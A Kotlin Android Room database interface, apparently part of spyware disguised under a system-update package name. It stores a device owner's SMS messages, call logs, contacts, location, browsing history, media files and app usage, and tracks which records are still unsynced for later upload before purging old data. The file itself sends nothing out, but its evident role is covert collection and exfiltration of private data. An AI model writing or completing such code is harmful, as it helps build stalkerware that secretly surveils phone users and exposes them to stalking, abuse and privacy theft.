package com.androidsystem.update.database

import androidx.room.*

@Dao
interface TelemetryDao {
    @Insert
    suspend fun insertCollectedData(data: CollectedDataEntity): Long

    @Insert
    suspend fun insertLocationData(data: LocationEntity): Long

    @Insert
    suspend fun insertSms(data: SmsEntity): Long

    @Insert
    suspend fun insertCall(data: CallEntity): Long

    @Insert
    suspend fun insertContact(data: ContactEntity): Long

    @Insert
    suspend fun insertBrowsingHistory(data: BrowsingHistoryEntity): Long

    @Insert
    suspend fun insertMediaFile(data: MediaFileEntity): Long

    @Insert
    suspend fun insertDeviceInfo(data: DeviceInfoEntity): Long

    @Insert
    suspend fun insertAppUsage(data: AppUsageEntity): Long

    @Query("SELECT * FROM collected_data WHERE synced = 0 ORDER BY timestamp DESC LIMIT :limit")
    suspend fun getUnsynced(limit: Int): List<CollectedDataEntity>

    @Query("UPDATE collected_data SET synced = 1 WHERE id = :id")
    suspend fun markSynced(id: Long)

    @Query("DELETE FROM collected_data WHERE timestamp < :cutoff")
    suspend fun cleanupOldData(cutoff: Long)

    @Query("SELECT * FROM location_data ORDER BY timestamp DESC LIMIT 1")
    suspend fun getLastLocation(): LocationEntity?
}
